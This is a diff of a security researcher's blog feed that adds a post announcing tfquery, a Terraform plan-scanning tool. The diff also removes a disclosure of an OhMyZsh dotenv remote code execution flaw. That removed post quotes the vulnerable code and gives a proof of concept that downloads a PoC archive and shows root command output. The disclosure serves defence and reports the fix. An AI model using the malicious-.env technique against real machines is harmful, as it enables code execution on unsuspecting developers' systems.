@@ -1,4 +1,49 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="https://mazinahmed.net/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mazinahmed.net/" rel="alternate" type="text/html" /><updated>2022-06-02T07:30:43-05:00</updated><id>https://mazinahmed.net/feed.xml</id><title type="html">Mazin Ahmed</title><subtitle>Cyber Security Engineer (Offensive Security)</subtitle><entry><title type="html">Twitch Internal Security Tools: In-depth Analysis of the Leaked Twitch Security Tools</title><link href="https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools/" rel="alternate" type="text/html" title="Twitch Internal Security Tools: In-depth Analysis of the Leaked Twitch Security Tools" /><published>2022-06-01T00:00:00-05:00</published><updated>2022-06-01T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools</id><content type="html" xml:base="https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools/">&lt;h2&gt;&lt;img src=&quot;https://raw.githubusercontent.com/mazen160/public/master/static/images/banner%20-%20Twitch%20Internal%20Security%20Tools%20blog%20post.png&quot; alt=&quot;&quot; /&gt;&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="https://mazinahmed.net/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mazinahmed.net/" rel="alternate" type="text/html" /><updated>2022-10-27T06:10:03-05:00</updated><id>https://mazinahmed.net/feed.xml</id><title type="html">Mazin Ahmed</title><subtitle>Cyber Security Engineer (Offensive Security)</subtitle><entry><title type="html">Scan Terraform plans and changes with tfquery via SQL-powered framework</title><link href="https://mazinahmed.net/blog/tfplan-release/" rel="alternate" type="text/html" title="Scan Terraform plans and changes with tfquery via SQL-powered framework" /><published>2022-10-27T00:00:00-05:00</published><updated>2022-10-27T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/tfplan-release</id><content type="html" xml:base="https://mazinahmed.net/blog/tfplan-release/">&lt;p&gt;New Release: tfquery now supports SQL queries for Terraform Plan Scanning&lt;/p&gt;
+
+&lt;h2&gt;&lt;img src=&quot;https://mazin.s3.amazonaws.com/public/29433340-4215-4e2e-a22b-27fe98b03e07/image1.png&quot; alt=&quot;&quot; /&gt;&lt;/h2&gt;
+
+&lt;p&gt;In case you’re an Infrastructure security engineer and have not tried tfquery yet, this will be a great blog post for you.&lt;/p&gt;
+
+&lt;p&gt;Tfquery is a framework that allows running SQL queries on Terraform code. It’s made to analyze your Terraform infrastructure, locate resources, run security compliance checks, spot misconfigured resources, develop CI benchmarks, and much more.&lt;/p&gt;
+
+&lt;p&gt;I developed it to solve an existing problem I’m facing: understanding large infrastructures quickly.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://mazin.s3.amazonaws.com/public/177d639e-7af5-489a-893c-fef9cf05b500/image2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Last year, I spoke at DEFCON about the risks of running Insecure Terraform environments, and how attackers can make use of current Terraform Enterprise environments to compromise the entire infrastructure with normal employee access to Github.&lt;/p&gt;
+
+&lt;p&gt;There was no patch or workaround released by HashiCorp to limit external providers or prevent local-exec data sources.&lt;/p&gt;
+
+&lt;p&gt;Tfquery support was specific to tfstate. It was able to run SQL queries on the current Terraform workspace state - and also supports multi-workspaces when importing state files.&lt;/p&gt;
+
+&lt;p&gt;I aimed to add support for tfplan within tfquery to be able to scan Terraform plans and changes. This will allow engineers to write Terraform misconfiguration checks as SQL checks.&lt;/p&gt;
+
+&lt;h3 id=&quot;semgrep-hcl-support-vs-tfquery&quot;&gt;semgrep HCL support vs. tfquery&lt;/h3&gt;
+
+&lt;p&gt;Semgrep announced in October 2021 the support for scanning HCL files. The challenge with semantic scanning of HCL code (a similar approach to what tfsec, checkov, and similar tools are doing) is that it’s limited to non-dynamic HCL code. Terraform is much more complex and without having the final state of rendered infrastructure code, checks would not be as accurate as needed.&lt;/p&gt;
+
+&lt;p&gt;Also, you may need to write a logic to make sure that findings are not alerted for a codebase already existing in your Terraform workspace, otherwise, you would be blocking the CI pipeline where a member did not introduce any vulnerable code.&lt;/p&gt;
+
+&lt;h1 id=&quot;tfquery-approach-for-terraform-plan-scanning&quot;&gt;tfquery approach for Terraform Plan scanning&lt;/h1&gt;
+
+&lt;p&gt;The idea is, that whenever a PR is created for a Terraform change, you should be able to scan changes through tfquery.&lt;/p&gt;
+
+&lt;p&gt;You can now write SQL queries that are much more elegant to:
+Check for providers if not matching an allowed list.
+Check for wildcard AWS Policies.
+Check for new IAM users.
+Check for an S3 bucket with versioning not being enabled.
+etc…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://mazin.s3.amazonaws.com/public/30564d22-28e4-43cf-b069-16c92b1a853d/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://mazin.s3.amazonaws.com/public/4cfb96bb-fcc7-4714-84e8-15cf4d53b846/image4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;try-tfquery-at-githubcommazen160tfquery&quot;&gt;Try tfquery at: &lt;a href=&quot;https://github.com/mazen160/tfquery&quot;&gt;github.com/mazen160/tfquery&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Find my DEFCON talk: &lt;a href=&quot;https://mazinahmed.net/blog/attacking-terraform-environments/&quot;&gt;mazinahmed.net/blog/attacking-terraform-environments&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="tfquery" /><category term="terraform" /><category term="tfplan" /><category term="devsecops" /><category term="devops" /><category term="cloudsecurity" /><summary type="html">New Release: tfquery now supports SQL queries for Terraform Plan Scanning</summary></entry><entry><title type="html">Twitch Internal Security Tools: In-depth Analysis of the Leaked Twitch Security Tools</title><link href="https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools/" rel="alternate" type="text/html" title="Twitch Internal Security Tools: In-depth Analysis of the Leaked Twitch Security Tools" /><published>2022-06-01T00:00:00-05:00</published><updated>2022-06-01T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools</id><content type="html" xml:base="https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools/">&lt;h2&gt;&lt;img src=&quot;https://raw.githubusercontent.com/mazen160/public/master/static/images/banner%20-%20Twitch%20Internal%20Security%20Tools%20blog%20post.png&quot; alt=&quot;&quot; /&gt;&lt;/h2&gt;
 
 &lt;p&gt;How Twitch was hacked? What security controls did Twitch build?&lt;/p&gt;
 
@@ -1982,109 +2027,4 @@ https://bscdev.meetzoom.us/nginx_status&lt;/p&gt;
   &lt;li&gt;RFC3986 - Section 5.2.4 - Remove Dot Segments: &lt;a href=&quot;http://tools.ietf.org/html/rfc3986#section-5.2.4&quot;&gt;http://tools.ietf.org/html/rfc3986#section-5.2.4&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://github.com/trustedsec/cve-2019-19781/issues/13&quot;&gt;https://github.com/trustedsec/cve-2019-19781/issues/13&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py#L140&quot;&gt;https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py#L140&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="web-security" /><category term="automation" /><summary type="html"></summary></entry><entry><title type="html">OhMyZsh dotenv Remote Code Execution</title><link href="https://mazinahmed.net/blog/ohmyzsh-dotenv-rce/" rel="alternate" type="text/html" title="OhMyZsh dotenv Remote Code Execution" /><published>2020-04-08T00:00:00-05:00</published><updated>2020-04-08T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/ohmyzsh-dotenv-rce</id><content type="html" xml:base="https://mazinahmed.net/blog/ohmyzsh-dotenv-rce/">&lt;hr /&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/static/91389496-77d3-4dbe-941b-180403841f58.png&quot; alt=&quot;&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;abstract&quot;&gt;Abstract&lt;/h1&gt;
-
-&lt;p&gt;OhMyZsh was vulnerable to an RCE (Remote Code Execution) vulnerability due to arbitrary trusting ENV files at the dotenv plugin. Users who download a malicious repository or a compressed file can have their machines compromised as a result of the vulnerability.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
-
-&lt;p&gt;&lt;strong&gt;OhMyZsh&lt;/strong&gt; is a highly popular framework for managing ZSH configuration. It’s an extremely popular project in the open-source community. At the time of writing, it’s ranked in the top 10 Github repositories across all projects.&lt;/p&gt;
-
-&lt;p&gt;I enjoy automating my setup with different configurations to be more productive at work. OhMyZsh helps me automating tasks along with my scripts and dot-files.&lt;/p&gt;
-
-&lt;p&gt;I wanted to automate a specific scenario in my development environment, where I have multiple projects at the same machine, and each project has specific environment variables that need to be loaded before starting development. There is a popular plugin at OhMyZsh that supports this functionality, known as the dotenv plugin.&lt;/p&gt;
-
-&lt;p&gt;According to the documentation:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;[OhMyZsh - dotenv plugin] automatically load your project ENV variables from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file when you &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; into project root directory.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Dotenv plugin loads environment variables when the user enters the project directory. It was made public in 2016, and the vulnerability has existed in the plugin for the past 3 years.&lt;/p&gt;
-
-&lt;p&gt;I wanted to review the source-code before running it on my dev machine.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;vulnerable-code&quot;&gt;Vulnerable Code&lt;/h1&gt;
-
-&lt;p&gt;Commit: &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/commit/f960e2be6f01abe5f185d668be661b57051322ac&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/commit/f960e2be6f01abe5f185d668be661b57051322ac&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-source_env&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;# test .env syntax&lt;/span&gt;
-    zsh &lt;span class=&quot;nt&quot;&gt;-fn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dotenv: error when sourcing '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' file&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;2
-
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; a &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
-      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;else
-      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
-      &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;
-      &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; +a
-    &lt;span class=&quot;k&quot;&gt;fi
-  fi&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-autoload &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; add-zsh-hook
-add-zsh-hook chpwd source_env
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
-    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ZSH_DOTENV_FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.env
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The method used in the dotenv plugin to set the environment variables makes use of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt; built-in command.&lt;/p&gt;
-
-&lt;p&gt;Although the command is typically seen when loading environment variables, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt; &lt;strong&gt;executes the provided input in Shell&lt;/strong&gt; - (within the same existing shell, that’s why the variables are loaded within the session).&lt;/p&gt;
-
-&lt;p&gt;In our case, whenever a user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; into a project directory, and that directory has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file, the file is passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt;, to load the variables - and &lt;em&gt;potentially more&lt;/em&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;if-the-user-downloads-a-malicious-repository-or-compressed-file-then-working-with-this-material-leads-to-a-remote-code-execution-when-using-ohmyzsh&quot;&gt;If the user downloads a malicious repository or compressed file, then working with this material leads to a remote code execution when using OhMyZsh.&lt;/h3&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h1&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://github.com/mazen160/public/raw/master/Proof-of-Concepts/ohmyzsh-dotenv-rce/dotenv-poc.zip&quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip dotenv-poc.zip
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;dotenv-poc
-&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-root:x:0:0:root:/root:/usr/bin/zsh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/static/603bb5cf-1ff1-450c-9328-a56c96facbfd.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;video&quot;&gt;Video&lt;/h3&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/hYkt5wLpzeM&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;
-
-&lt;p&gt;I made a PR to fix the vulnerability at &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/pull/8606&quot;&gt;ohmyzsh - PR #8606&lt;/a&gt;. The simple fix to the issue is to prompt the user to confirm the issuance of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt; command to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file. It was enhanced and pushed to OhMyZsh master branch now. The update introduces an option for TOFU (Trust on First Use) where trusted paths can be set it be whitelisted. Users can make sure they’re using an updated version to protect against the vulnerability when using the dotenv plugin.&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
-
-&lt;p&gt;It was an interesting session that occurred by coincidence when working on setting up a development environment. The outcome of the session resulted in finding a vulnerability in the ohmyzsh project.&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;pr-httpsgithubcomohmyzshohmyzshpull8606&quot;&gt;PR: &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/pull/8606&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/pull/8606&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;First Release commit (2016): &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/commit/8d35fa0e2f32dab6894ca06bfc333af94be97ec7&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/commit/8d35fa0e2f32dab6894ca06bfc333af94be97ec7&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://ss64.com/bash/source.html&quot;&gt;https://ss64.com/bash/source.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><summary type="html"></summary></entry></feed>
+&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="web-security" /><category term="automation" /><summary type="html"></summary></entry></feed>
